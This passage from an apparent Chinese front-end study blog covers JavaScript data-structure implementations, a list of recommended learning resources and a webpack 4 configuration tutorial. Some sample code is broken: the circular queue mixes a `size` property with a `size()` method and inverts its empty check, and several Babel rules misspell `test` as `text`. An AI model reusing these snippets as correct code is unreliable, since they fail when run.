O(nlog(n)) O(nlog(n)) O(n2) 堆排序 O(nlog(n)) O(nlog(n)) O(nlog(n)) 桶排序 O(n+k) O(n+k) O(n2) 基数排序 O(nk) O(nk) O(nk) 栈栈是一个线性结构，在计算机中是一个相当常见的数据结构，栈的特点是只能在某一端添加或者删除数据，遵循先进后出的规则（FILO）的原则 实现1234567891011121314151617181920212223242526272829class Stack &#123; constructor() &#123; this.stack = [] &#125; // 添加一个或者结构新元素到栈顶 push(item) &#123; this.stack.push(item) &#125; // 移除栈顶的元素 pop() &#123; return this.stack.pop(); &#125; // 返回栈顶的元素 peek() &#123; return this.stack[this.size() - 1] &#125; size() &#123; return this.stack.length &#125; isEmpty() &#123; return this.size() === 0 &#125; clear() &#123; this.stack = []; &#125; getStack() &#123; return this.stack; &#125;&#125; 应用题意是匹配括号，可以通过栈的特性来完成这道题目 123456789101112131415161718192021const isVaild = function (s) &#123; let map = &#123; "(": -1, ")": 1, "[": -2, "]": 2, "&#123;": -3, "&#125;": 3, &#125; const stack = new Stack(); for (let i = 0; i &lt; s.length; i++) &#123; if (map[s[i]] &lt; 0) &#123; stack.push(s[i]) &#125; else &#123; let last = stack.pop() if (map[last] + map[s[i]] != 0) return false &#125; &#125; if (stack.size() === 0) return true return false&#125; 在 Vue 中关于模板解析的代码，就有应用到匹配尖括号的内容 队列队列是一个线性结构，特点是在某一段添加数据，在另一端删除数据，遵循先进先出的原则（FIFO） 实现分成单链队列和循环队列 单链队列1234567891011121314151617181920212223class Queue &#123; constructor() &#123; this.queue = [] &#125; enQueue(item) &#123; this.queue.push(item) &#125; deQueue() &#123; return this.queue.shift(); &#125; front() &#123; return this.queue[0] &#125; size() &#123; return this.queue.length &#125; isEmpty() &#123; return this.size() === 0 &#125; clear() &#123; this.queue = []; &#125;&#125; 因为单链队列在出队操作的时候㤇 O(n)的时间复杂度，所以引入了循环队列，循环队列的出队操作平均是 O(1)的时间复杂度 循环队列12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class sqQueue &#123; constructor(length) &#123; this.queue = new Array(length - 1); // 队头 this.first = 0; // 队尾 this.last = 0; // 当前队列的大小 this.size = 0; &#125; enQueue(item) &#123; // 如果队尾 +1 是否为队头，如果是就代表需要扩容数组，%this.queue.length 是为了防止数组越界 if (this.first === (this.last + 1) % this.queue.length) &#123; this.resize(this.size() * 2 + 1) &#125; this.queue[this.last] = item; this.size++; this.last = (this.last + 1) % this.queue.length &#125; deQueue() &#123; if (this.isEmpty()) &#123; throw Error('Queue is empty'); &#125; let r = this.queue[this.first]; this.queue[this.first] = null; this.first = (this.first + 1) % this.queue.length; this.size--; // 判断当前队列是否过小，为了保证不浪费空间，在队列空间等于总长度四分之一的时候且不为2时缩小总长度为当前的一半 if (this.size === this.size() / 4 &amp;&amp; this.size() / 2 !== 0) &#123; this.resize(this.size() / 2); &#125; return r; &#125; front() &#123; if (this.size()) &#123; throw Error('Queue is empty'); &#125; return this.queue[this.first] &#125; size() &#123; return this.queue.length - 1; &#125; isEmpty() &#123; return this.first === this.last; &#125; resize(length) &#123; let q = new Array(length); for (let i = 0; i &lt; length; i++) &#123; q[i] = this.queue[(i + this.first) % this.queue.length] &#125; this.queue = q; this.first = 0; this.last = this.size &#125;&#125; 链表链表是一个线性结构，同时也是一个天然的递归结构。链表结构可以充分利用计算机内存空间，实现灵活的内存活动管理。但是链表失去了数组随机读取的优点，同时链表也增加了结点的指针域，空间开销比较大。 实现单向链表 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class LinkList &#123; constructor() &#123; // 链表长度 this.size = 0; // 虚拟头部 this.dummyNode = new Node(null, null); &#125; find(header, index, currentIndex) &#123; if (index === currentIndex) return header return this.find(header.next, index, currentIndex + 1); &#125; addNode(v, index) &#123; this.checkIndex(index); // 当往链表末尾插入时，prev.next 为空，其他情况时，因为要插入节点，所以插入的节点的next 应该是 prev.next 然后设置 prev.next 为插入的节点 let prev = this.find(this.dummyNode, index, 0); prev.next = new Node(v, prev.next); this.size++; return prev.next; &#125; insertNode(v, index) &#123; return this.addNode(v, index); &#125; addToFirst(v) &#123; return this.addNode(v, 0); &#125; addToLast(v) &#123; return this.addNode(v, this.size); &#125; removeNode(index, isLast) &#123; this.checkIndex(index); index = isLast ? index - 1 : index; let prev = this.find(this.dummyNode, index, 0); let node = prev.next; prev.next = node.next; node.next = null; this.size--; return node; &#125; removeFirstNode() &#123; return this.removeNode(0); &#125; removeLastNode() &#123; return this.removeNode(this.size, true); &#125; checkIndex(index) &#123; if (index &lt; 0 || index &gt; this.size) throw Error('Index error'); &#125; getNode(index) &#123; this.checkIndex(index); if (this.isEmpty()) return; return this.find(this.dummyNode, index, 0).next; &#125; isEmpty() &#123; return this.size === 0; &#125; size() &#123; return this.size; &#125;&#125; 树二叉树树拥有很多种结构，二叉树是树中最常见的结构，同时也是一个天然的递归结构 二叉树拥有一个根节点，每个节点至多拥有两个子节点，分别为：左节点和右节点。树的最底部节点称之为叶节点，当一棵树的数量为满，该树就可以称之为二叉树 graph TD A[2] --> B[7] A[2] --> C[5] C[5] --> F[9] F[9] --> J[4] B[7] --> D[2] B[7] --> E[6] E[6] --> G[5] E[6] --> H[11] 二分搜索树二分搜索树也是二叉树，拥有二叉树的特性。但是区别于在二分搜索树每个节点的值都比它的左子树的值大，比右子树的值小。 这种存储方式很适合数据搜索。如下图显示，当需要查找6的时候，因为需要查找的值比根节点的值大，所以只需要在根节点的右子树上寻找，大大提高了搜索效率 graph TD A[5] --> B[2] B[2] --> C[1] B[2] --> D[4] D[4] --> E[3] A[5] --> F[6] F[6] --> G[7] 实现具体可以点击这里 CSS 常考面试题目资料 50道CSS基础面试题（附答案） 《50道CSS基础面试题（附答案）》中的答案真的就只是答案吗？ CSS 面试题总结 front-end-interview-handbook 推荐的资料JS You-Dont-Know-JS，这套书深入的讲解很多 JS 的内容，英文版是开源免费阅读的，如果你英文不好的话，国内这套书已经有出版了，可以选择购买。 Functional-Light-JS，这本书是讲解函数式编程的，函数式编程也是一种编程范式，轻量级的函数式可以很方便的解决很多问题，有兴趣的可以一读。 33-js-concepts，这份资料讲解了 33 个前端开发必须知道的 JS 概念，内容是英文的，如果你英文不好的话，可以寻找这份资料的中文版。 前端精读周刊，这是一份前端好文集合，每周都会更新，目前已经更新了 84 篇文章。 前端性能清单，这是一份前端性能清单，如果你需要优化一个项目的话，可以根据这份清单一个个来检查优化项。 30-seconds-of-code，30 秒系列，很短的代码片段让你了解一个知识点。 must-watch-javascript，这份资料包含了很多高质量的前端相关视频，值得一看。 CSS css-protips，通过这份资料你可以学习到很多 tips 来提高你的 CSS 技能。 30-seconds-of-css，30 秒系列，很短的代码片段让你了解一个知识点 CSS 世界，张鑫旭出版的书籍，没什么好说的了，看就是了。 一些有趣的 CSS 话题，CSS 奇技淫巧，在这里，都有。 框架React 核心团队成员 Dan Abramov 的 blog。 Node Node.js 调试指南，这是一本专注于讲解 Node 调试的书籍，已经出版了，但是可以开源免费阅读。 Node.js：来一打 C++ 扩展，死月出版的书籍，没什么好说的，看就是了。 Node.js 最佳实践，这是对 Node.js 最佳实践中排名最高的内容的总结和分享 安全 the-book-of-secret-knowledge，这是一份安全领域的资料，如果你对安全感兴趣的话，可以阅读一下内容。 周报 奇舞周刊，每周都会整理一份不错的中文文章合集。 TechBridge Weekly，这是一份台湾地区整理的一份多个技术领域的周报。 JavaScript Weekly，这是一份相当有名气的英文周报，整理的文章质量都很高，如果你只想订阅一份周报，那就是它了。 Pony Foo Weekly，这也是一份不错的英文周报，文章质量也很高，并且和上一份周报重叠的内容不多。 MediumMedium 上我并没有怎么固定阅读，更多的是订阅它的日报或者从别的周报上看到的 Medium 的文章，但是如果一定要推荐两个组织的话，我只推荐这两个，毕竟他们的文章质量都很高。 freecodecamp hackernoon YoutubeYoutube 有很多高质量的视频，但是门槛大家都知道，这里我推荐一些值得订阅的频道。 JSConf，很多会议的视频你都可以在这里找到。 Google Chrome Developers，Google 金字招牌，没啥好说的。 Computerphile，内容偏向于计算机领域。 Coding Tech，内容偏向于入门。 Fun Fun Function，如果你想学习函数式编程的一些内容，这是一个值得订阅的频道。 DevTips，每周更新一个视频，能够学习到不少开发中的 Tips。 其他 互联网公司技术架构，这份资料介绍了当下互联网公司的一个技术架构。 javascript-algorithms，这份资料作者使用了 JS 来实现了大部分的数据结构和算法。 小型编译器，这份资料告诉了我们该如何去实现一个小型的编译器，很适合前端开发者阅读。 every-programmer-should-know，这份资料列举了很多每个开发者都应该知道的知识点。]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>前端面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack4.x从基础到实战]]></title>
    <url>%2F2019-04-13-webpack4x%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%9E%E6%88%98.html</url>
    <content type="text"><![CDATA[DellLee 老师的 webpack 学习与记录 知识点： Loader HMR Create React App Caching Plugin SourceMap Vue Cli 3.0 Shimming WebpackDevServer TreeShaking CodeSplitting Babel React Library Eslint PWA Vue Mode 性能优化 多页应用 原理 PreLoading PreFetching 环境变量 TypeScript Webpack 是什么本质上，webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。当 webpack 处理应用程序时，它会递归地构建一个依赖关系图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle。 扩展阅读-Modules webapack 打包浅析1234567891011const path = require('path');module.exports = &#123; // production 模式下代码压缩，development 代码不压缩 mode: 'production', entry: './src/index.js', output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'dist') &#125;&#125; Loadermodule 处理方案，loader 有先后顺序，从下到上，从右到左 file-loader处理图片 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566module.exports = &#123; // 开发还是生产环境 mode: 'production', // 进口 entry: './src/index.js', // 模块处理 module: &#123; // 规则 rules: [&#123; // 匹配 test: /\.jpg$/, // loader 运用 use: &#123; loader: 'file-loader', // 占位符 options: &#123; // 定义文件的名字：原来的名字_哈希值.原来的后缀 name: '[name]_[hash].[ext]', // 图片输出路径 outputPath:'./images/' &#125; &#125; &#125;] &#125;, // 输出 output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'dist') &#125;&#125;// 或者是用方法的方式module.exports = &#123; // 开发还是生产环境 mode: 'production', // 进口 entry: './src/index.js', // 模块处理 module: &#123; // 规则 rules: [&#123; // 匹配 test: /\.jpg$/, // loader 运用 use: &#123; loader: 'file-loader', // 占位符 options: &#123; // 定义文件的名字：原来的名字_哈希值.原来的后缀 name(file)&#123; if(process.env.NODE_ENV === 'development')&#123; return '[path][name].[ext]', &#125; return '[hash][ext]' &#125;, // 图片输出路径 outputPath:'./images/' &#125; &#125; &#125;] &#125;, // 输出 output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'dist') &#125;&#125; url-loader会把图片打包到js 文件中，如果图片很小（1-2kb）的话就适合以base64的形式打包到js里面 12345678910111213141516171819202122module.exports = &#123; mode: 'development', entry: './src/index.js', module: &#123; rules: [&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', // 限制图片的大小（Kb）,小于的会被打包到js里面，大于则打包到指定目录下 limit: 2048 &#125; &#125; &#125;] &#125;, output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'dist') &#125;&#125; 也可以用来处理字体文件 12345678module: &#123; rules: [&#123; test:/\.(eot|ttf|svg|woff)$/, use:&#123; loader:'file-loader' &#125; &#125;]&#125;, style-loader、css-loader处理css 样式 css-loader 分析有几个css文件以及它们之间的关系是怎么样的然后合并为一个css style-loader 会把 css-loader 合并的内容挂载到页面上 node-sass、sass-loader：应对 sass 文件，上面的组合处理sass 文件不会报错，但是不会转义sass 特殊的语法 123456module: &#123; rules: [ &#123; test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] &#125;]&#125;, postcss-loader、autoprefixer自动添加css前缀 在文件的根目录配置 postcss.config.js 12345module.exports = &#123; plugins:[ require('autoprefixer'), ]&#125; webapck.config.js 更改 123456module: &#123; rules: [ &#123; test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader','postcss-loader'] &#125;]&#125;, 如果有样式引用其他样式的情况要重新定义 css-loader 使得被引入的 scss 等有语义的css 文件可以重新跑多一次全部的 loader 123456789101112module: &#123; rules: [ &#123; test: /\.scss$/, // 当 loader 有参数配置的时候使用对象 use: ['style-loader', &#123; loader:'css-loader', options:&#123; importLoaders:2 &#125; &#125;, 'sass-loader','postcss-loader'] &#125;]&#125;, 开启模块化： 1234567891011121314module: &#123; rules: [ &#123; test: /\.scss$/, // 当 loader 有参数配置的时候使用对象 use: ['style-loader', &#123; loader:'css-loader', options:&#123; importLoaders:2, // css 模块化 modules:true &#125; &#125;, 'sass-loader','postcss-loader'] &#125;]&#125;, 其他具体的loader Plugins可以在webpack 运行打包到某个时刻帮你实现一些事情 html-webpack-plugin会在打包结束后自动生成一个 html 文件，并把打包生成的 js 自动引入到这个 html 文件中 123456module.exports = &#123; plugins: [new HtmlWebpackPlugin(&#123; // 设置默认的模板 template: 'src/index.html' &#125;)]&#125; clean-webpack-plugin打包之前去掉旧的dist 项目 1234plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin()], clean-webpack-plugin2.0 的新参数 Output、Entry多文件输出预设的名字 123456789101112module.export = &#123; entry:&#123; main:'./src/index.js', sub:'./src/index.js' &#125;, output:&#123; // 可以定义输出的跟路径，如果图片是cdn上面的，可以在从这里设置，html 引入这个js会自动加上 publicPath:'xx', filename:'[name].js' path:path.resolve(__dirname,'dist') &#125;&#125; SouceMapdevelopment 模式下 devtool 默认是true,开启souceMap 通过映射当代码出错的时候可以找到源文件是哪里出错而不是编译后的文件哪里出错. 当然建立这种映射会影响打包速度 具体内容 12345678module.exports = &#123; mode: 'development', // 这里可以关闭 sourceMap，开启则是'source-map' devtool: 'none', entry: &#123; main: './src/index.js' &#125;&#125; souce-map会在dist 自动生成一个 js.map 映射文件，而inline-souce-map 则是将这个关系包含在 打包的js文件里面。 使用 cheap-xxx–xxx 的参数会加快打包方式，但是只会提示到几行不会精确到几列。 开发环境（development）推荐使用：cheap-module-eval-source-map（module代表module里面的错误也可以检测到，eval 可以加快编译速度） 生产环境（pruduction）则是：cheap-module-source-map WebpackDevServerwebpack-dev-server 帮助打包后的运行在自动打开的服务器，并会跟随文件的改变而改变 12345678910111213141516171819module.exports = &#123; devServer:&#123; // 要打开的文件地址 contentBase:'./dist', // 是否自动打开默认浏览器 open:true, // 端口号，默认端口是8080 port:8080 &#125;&#125;// package.json&#123; "scripts": &#123; "start": "webpack-dev-server", "watch": "webpack --watch" &#125;,&#125; webpack-dev-server 打包的时候会把打包的 dist 目录内置到内存里面而不会显示出来，可以提高编译速度 相关内容 一开始的时候webpack-dev-server 因为配置不是很完善，一般人都会自己创建一个 server.js 文件来自己建一个服务器 这里使用 express 和 webpack-dev-middleware 来实现 1234567891011121314151617181920212223const express = require('express');const webpack = require('webpack');// 中间件可以监听，随着页面内容的改变而更改const webpackDevMiddleware = require('webpack-dev-middleware');const config = require('./webpack.config.js');// 使用 webpack 的配置来返回一个编译器const complier = webpack(config);const app = express();app.use(webpackDevMiddleware(complier,&#123; publicPath:config.output.publicPath&#125;));app.listen(3000,()=&gt;&#123; console.log('server is running on port 3000');&#125;);// package.json&#123; "scripts": &#123; "middleware": "node server.js" &#125;,&#125; 但是上面的内容是没有实现浏览器自动加载的。 Hot Module Replacement(HMR)热模块更新，不刷新页面，重新加载css文件 1234567891011121314module.exports = &#123; devServer: &#123; contentBase: './dist', open: true, port: 8080, // 启动热模块加载 hot: true, // 即便 html 不生效也不会自动刷新 hotOnly: true &#125;, plugins:[ new webpack.HotModuleReplacementPlugin() ]&#125; 只修改对应的 js 文件 12345if(module.hot)&#123; module.hot.accept('./文件名.js',()=&gt;&#123; // 运用页面的函数 &#125;)&#125; 而css 对应的代码是在 css-loader 里面底层实现了，所以不用手写 module.hot Babel 处理 ES6 语法babel-loader 与 @babel-core(webpack与 babel 桥梁) @babel/preset-env 123456789101112module.exports = &#123; module:&#123; rules:[&#123; text:/\.js$/, exclude:/node_modules/, loader:'babel-loader', options:&#123; presets:['@babel/preset-env'] &#125; &#125;] &#125;&#125; 这里可以将 ES6 语法转换为 ES5 语法，但是还不完善，接着在index.js里面直接引入 12// index.jsimport '@babel/polyfill' @babel/polyfill 可以自动添加内容实现兼容低版本的浏览器。打包之后会发现打包的js会很大，因为它把所有低版本可能要兼容的代码都写了进去，而不是按需要来增加内容。这个时候可以通过配置来达到按需 1234567891011121314module.exports = &#123; module:&#123; rules:[&#123; text:/\.js$/, exclude:/node_modules/, loader:'babel-loader', options:&#123; presets:[['@babel/preset-env'],&#123; useBuiltIns:'usage' &#125;] &#125; &#125;] &#125;&#125; webpack 进行打包的时候发现会报错 1Module not found: Error: Can't resolve 'core-js/modules/es6.array.map' 之类的错误，通过查阅发现要下载一个 core-js 的插件便可以解决问题，具体可以查看 core-js 而当你使用这个按需加载的时候，就会提示你去掉文件中 import ‘@babel/polyfill’ ,因为会自动加载，另外可以配置要兼容的浏览器版本来判断需要引入那些兼容代码 1234567891011121314151617module.exports = &#123; module:&#123; rules:[&#123; text:/\.js$/, exclude:/node_modules/, loader:'babel-loader', options:&#123; presets:[['@babel/preset-env'],&#123; useBuiltIns:'usage', targets:&#123; chrome:'67' &#125; &#125;] &#125; &#125;] &#125;&#125; 而上面的版本的谷歌浏览器是支持 ES6 语法的，因为打包出来的文件就会很小。可以看出来上面的方式有可能会全局污染(适合小项目)，可以使用另外一种方式去配置（适合多模块） 1234567891011121314151617module.exports = &#123; module:&#123; rules:[&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader', options:&#123; plugins:[['@babel/plugin-transform-runtime',&#123; corejs:2, helpers:true, regenerator:true, useESModules:false &#125;]] &#125; &#125;] &#125;&#125; 配置上面的内容之前需要安装以下几个依赖 1npm i -D @babel/runtime @babel/plugin-transfrom-runtime @babel/runtime-corejs2 具体可以查看这里 另外可以把 babel-loader options 里面的内容放在一个单独名为 .babelrc 的文件中 12345678910111213&#123; "plugins": [ [ "@babel/plugin-transform-runtime", &#123; "corejs": 2, "helpers": true, "regenerator": true, "useESModules": false &#125; ] ]&#125; 打包 React 代码安装依赖包 1npm i -D @babel/preset-react 配置 .babelrc 12345678910111213141516&#123; "presets": [ [ "@babel/preset-env", &#123; "targets": &#123; "chrome": "67" &#125;, "useBuiltIns": "usage" &#125; ], [ "@babel/preset-react" ] ]&#125; 这里的顺序也是从下往上 具体点击这里 Tree Shakingdevelopment 环境，按需加载，只支持 ES Module ，底层是一个静态引入实现 1234567891011121314// index.js 只引入 add 的打包结果/*! exports provided: add, minus *//*! exports used: add */// 通过下面的配置// webpack.config.jsmodule.exports = &#123; optimization:true&#125;// package.json&#123; // 因为只是单纯引入，挂载在全局而不用去使用里面具体的，以防止被去掉，使用这个参数可以做一个过滤不作 tree Shaking "sideEffects":["@babel/polyi-fill","*.css"]&#125; production 环境甚至需要 optimization 配置，会自动配置，但是 package.json 中的 sideEffects 需要保留 Development 和 Production 模式的区分打包123456&#123; "scripts": &#123; "dev": "webpack-dev-server --config webpack.dev.js", "build": "webpack --config webpack.prod.js", &#125;,&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131// webpack.dev.jsconst webpack = require('webpack');const path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');module.exports = &#123; mode: 'development', devtool: 'cheap-module-eval-source-map', entry: &#123; main: './src/index.js' &#125;, devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true, hotOnly: true &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader' &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.scss$/, use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 2, // modules: true &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(), new webpack.HotModuleReplacementPlugin() ], optimization:&#123; usedExports:true &#125;, output: &#123; publicPath: '/', filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125;// webpack.prod.jsconst webpack = require('webpack');const path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');module.exports = &#123; mode: 'production', devtool: 'cheap-module-source-map', entry: &#123; main: './src/index.js' &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader' &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.scss$/, use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 2, // modules: true &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(), ], output: &#123; publicPath: '/', filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125; 可以看出上面有很多重复的代码，可以进行抽取优化，用 webpack-merge 进行合并 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889// webpack.common.jsconst path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');module.exports = &#123; entry: &#123; main: './src/index.js' &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader' &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.scss$/, use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 2, // modules: true &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(), ], output: &#123; publicPath: '/', filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125;// webpack.dev.jsconst webpack = require('webpack');const merge = require('webpack-merge');const commonConfig = require('./webpack.common.js');const devConfig = &#123; mode: 'development', devtool: 'cheap-module-eval-source-map', devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true &#125;, plugins: [ new webpack.HotModuleReplacementPlugin() ], optimization:&#123; usedExports:true &#125;&#125;module.exports = merge(commonConfig,devConfig);// webpack.prod.jsconst merge = require('webpack-merge');const commonConfig = require('./webpack.common.js');const prodConfig = &#123; mode: 'production', devtool: 'cheap-module-source-map'&#125;module.exports = merge(commonConfig,prodConfig); Webpack 和 Code Splitting同步代码遇到公共类库，会自动打包出来一个文件，例如 vendors~main.js 12345module.exports = &#123; splitChunks:&#123; chunks:'all' &#125;&#125; 异步代码安装 babel-plugin-dynamic-import-webpack 后在 .babelrc 里面配置,这个插件不是官方的，所以不支持魔法注释 1234567891011121314151617&#123; "presets": [ [ "@babel/preset-env", &#123; "targets": &#123; "chrome": "67" &#125;, "useBuiltIns": "usage" &#125; ], [ "@babel/preset-react" ] ], "plugins":["dynamic-import-webpack"]&#125; 官方的 @babel/plugin-syntax-dynamic-import 可以支持魔术注释 重新配置 .babelrc 1234567891011121314151617&#123; "presets": [ [ "@babel/preset-env", &#123; "targets": &#123; "chrome": "67" &#125;, "useBuiltIns": "usage" &#125; ], [ "@babel/preset-react" ] ], "plugins":["@babel/plugin-syntax-dynamic-import"]&#125; webpack.common.js 12345678910module.exports = &#123; splitChunks:&#123; chunks:'all', cacheGroups:&#123; // 取消名字前面的默认名称 vendors:false, default:false &#125; &#125;&#125; index.js 123456789101112// 使用魔法注释function getComponent()&#123; return import(/* webpackChunkName:"lodash" */'lodash').then((&#123;default:_&#125;) =&gt;&#123; const element = document.createElement('div'); element.innerHTML = _.join(['Dell','Lee'],'_'); return element; &#125;)&#125;getComponent().then(element=&gt;&#123; document.body.appendChild(element);&#125;); 打包编译之后就可以看到异步引入的库被自己定义的名字打包出来了 splitChunksPlugins默认配置： 123456789101112131415161718192021222324252627282930313233343536373839module.exports = &#123; //... optimization: &#123; splitChunks: &#123; // 只对异步代码生效 all 则是全部代码，inintal 则是同步代码 chunks: 'async', // 引入的模块/包/库 大于 30kb 则会代码分割 minSize: 30000, // 会尝试将 大于这个尺寸的库重新拆分为n个 maxSize 大的库，但是一般这个参数不会生效 maxSize: 0, // 打包生成的库的次数少于 minChunks次 则不会分割 minChunks: 1, maxAsyncRequests: 5, maxInitialRequests: 3, // 自动生成的文件的中间符 automaticNameDelimiter: '~', name: true, // 配合 cacheGroups 使用 // 缓存组 cacheGroups: &#123; vendors: &#123; // 如果引入的库在 node_modules 里面，符合这个组打包出来的文件前缀会有vendors~入口.js test: /[\\/]node_modules[\\/]/, // 优先级 符合 在 node_modules 优先级大于在默认的，那么打包就会打包在 vendors 这个相关配置里面 priority: -10, // 强制定义在同一个文件里面，可以不配置 filename:'vendors.js' &#125;, // 默认处理途径 default: &#123; minChunks: 2, priority: -20, // 如果 模块在前面打包过了就不会重复打包 reuseExistingChunk: true， filename:'common.js' &#125; &#125; &#125; &#125;&#125;; Lazy loading 懒加载通过 import 语法来异步加载，什么时候要使用则是取决于个人 1234567891011121314151617181920212223242526function getComponent()&#123; return import(/* webpackChunkName:"lodash" */'lodash').then((&#123;default:_&#125;) =&gt;&#123; const element = document.createElement('div'); element.innerHTML = _.join(['Dell','Lee'],'_'); return element; &#125;)&#125;document.addEventListener('click',()=&gt;&#123; getComponent().then(element=&gt;&#123; document.body.appendChild(element); &#125;);&#125;)// async await 改进async function getComponent()&#123; const &#123;default:_&#125; = await import(/* webpackChunkName:"lodash" */'lodash'); const element = document.createElement('div'); element.innerHTML = _.join(['Dell','Lee'],'_'); return element;&#125;document.addEventListener('click',()=&gt;&#123; getComponent().then(element=&gt;&#123; document.body.appendChild(element); &#125;);&#125;) 打包分析配置 package.json 12345&#123; "scripts":&#123; "dev-build":"webpack --profile --json &gt; stats.json --config ./build/webpack.dev.js" &#125;&#125; 上面代码的意思是分析webapck 打包的文件生成后生成 stats.json 。 点击这个网站可以将这个json 文件上传，会帮你自动分析版本，时长以及相关错误，模块之间的关系等等 更多相关工具 Preloading,Prefetching在谷歌浏览器 ctrl+shift+p 输入show Coverage 点击录制后可以看到一个网站首屏加载 js 文件的利用率，以及可以优化的可能。 12345678910111213// 当浏览器空闲的时候，可以先加载这个文件document.addEventListener('click',()=&gt;&#123; import(/* webpackPrefetch:true*/'./click.js').then((&#123;default:func&#125;)=&gt;&#123; func(); &#125;)&#125;)// 这个则是和核心文件一起加载document.addEventListener('click',()=&gt;&#123; import(/* webpackPreloading:true*/'./click.js').then((&#123;default:func&#125;)=&gt;&#123; func(); &#125;)&#125;) 性能优化在缓存上面可以优化的地方有限，可以考虑更多是代码的使用率，将一开始不会用的代码尽量使用异步加载的方式来加载 CSS 文件的代码分割mini-css-extract-plugin,没有实现 HMR 需要手动配置，所以一般是适用在线上环境使用。 配置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131// webpack.common.jsconst path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');module.exports = &#123; entry: &#123; main: './src/index.js' &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader' &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(&#123; cleanOnceBeforeBuildPatterns:[path.resolve(__dirname,'../dist')], &#125;), ], optimization:&#123; usedExports:true, splitChunks:&#123; chunks:'all' &#125; &#125;, output: &#123; publicPath: './', filename: '[name].js', path: path.resolve(__dirname, '../dist') &#125;&#125;// webpack.dev.jsconst webpack = require('webpack');const merge = require('webpack-merge');const commonConfig = require('./webpack.common.js');const devConfig = &#123; mode: 'development', devtool: 'cheap-module-eval-source-map', devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true &#125;, module:&#123; rules:[ &#123; test: /\.scss$/, use: [ 'style-loader', 